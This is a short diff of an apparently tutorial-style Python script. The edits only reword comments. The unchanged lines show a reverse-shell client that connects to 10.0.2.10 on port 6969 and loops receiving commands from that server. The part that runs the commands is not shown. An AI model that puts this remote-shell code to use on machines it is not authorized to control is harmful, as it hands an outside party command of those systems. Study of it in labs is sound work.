@@ -6,9 +6,9 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
 s.connect(('10.0.2.10',6969)) # use connect method. takes address tuple as argument ('<IP>', <PORT>). change it to your server machine
 
 while True:
-    # here we store in the command variable what we want to receive something from this socket
+    # here we store in the command variable what we want to receive from this socket
     command = s.recv(4096).decode("UTF-8") # recv(<max bytes of data the socket will allow>)
-                                           # decode will be needed cuz data will be sent as binary (default=UTF-8)
+                                           # decode will be needed because data will be sent as binary (default=UTF-8)
 
     if command == "exit":
         s.close()
